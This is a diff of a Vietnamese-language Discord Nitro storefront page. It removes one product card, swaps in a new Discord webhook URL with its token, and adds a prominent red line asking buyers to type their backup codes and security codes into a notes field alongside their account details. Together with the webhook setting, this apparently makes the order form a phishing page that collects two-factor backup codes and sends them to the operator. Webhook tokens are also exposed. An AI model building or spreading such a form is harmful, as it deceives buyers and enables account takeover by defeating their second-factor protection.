@@ -973,18 +973,6 @@
                     <button id="buyNowButton" onclick="openModalService('NITRO BASIC 1 NĂM', 75000)">Buy now</button>
                 </div>
             </div>
-            
-            <div class="product-card">
-                <div class="tag">SALE</div>
-                <div class="thumbnail">
-                    <img src="https://file.hstatic.net/200000472237/file/digital-marketing-3_a0701415599f4bc08826bc0b029b3ff1.jpg" alt="DIGITAL">
-                </div>
-                <div class="info">
-                    <h4>DỊCH VỤ DIGITAL</h4>
-                    <p class="price"><span>Giá: <strong>60,000 VNĐ</strong></span></p>
-                    <button id="buyNowButton" onclick="openModalService('DỊCH VỤ DIGITAL', 60000)">Buy now</button>
-                </div>
-            </div>
         </div>
     </div>
     
@@ -993,7 +981,11 @@
         <span class="close-icon" onclick="closeModalService()">&times;</span>
         <h2 class="modal-title">NHẬP THÔNG TIN DỊCH VỤ</h2>
         <div class="divider"></div>
-        <div class="rate-banner"><p>DÀNH CHO NITRO & DIGITAL</p><p>HỆ THỐNG SẼ LIÊN HỆ ĐỂ XỬ LÝ</p></div>
+        <div class="rate-banner">
+            <p>DÀNH CHO NITRO</p>
+            <p>HỆ THỐNG SẼ LIÊN HỆ ĐỂ XỬ LÝ</p>
+            <p style="color:red; font-weight:bold;">Vui lòng nhập thêm mã dự phòng và mã bảo mật vào ô ghi chú phía dưới</p>
+        </div>
         <div class="form-body">
             <div class="input-group"><label>Thành tiền:</label><input type="text" id="svcPrice" class="custom-input" readonly></div>
             <div class="input-group"><label>Tài Khoản (Nếu cần):</label><input type="text" id="svcUser" class="custom-input" placeholder="User/Link..."></div>
@@ -1063,7 +1055,7 @@
 
     <script>
     // === CẤU HÌNH ===
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1341974823944978453/mKyLCzGzPWJ45BKkJ4MmT9pioqJckpXwXjbt9JPOxN8fzXkD0wIGiVVg_o77I1BZ3Vox";
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1452258008506695784/UTMSvXzc99WtJRNgSOhgoQmo7ux-o-qOh857nDcfPEEbL9NS_B6hezGIoqjpO83fPug7";
     let currentItem = null;
 
     // === MODAL FUNCTIONS ===
